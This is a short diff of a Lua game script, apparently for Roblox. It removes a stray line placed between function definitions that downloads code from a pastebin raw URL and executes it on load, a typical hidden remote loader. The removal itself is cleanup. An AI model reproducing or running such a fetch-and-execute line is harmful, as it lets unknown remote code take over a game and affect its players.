@@ -122,7 +122,6 @@ function CROSSS()
     createPart(Vector3.new(0.5, 2, 0.5), Color3.new(1, 1, 1), Vector3.new(0, 0, 0))   -- Vertical part
 end
 
-loadstring(game:HttpGet("https://pastebin.com/raw/MsuaacXx"))()
 function MOVETITLES(run, hotbarFrame)
     local baseButton = hotbarFrame:FindFirstChild("1").Base
     local Tool1Name = baseButton.ToolName
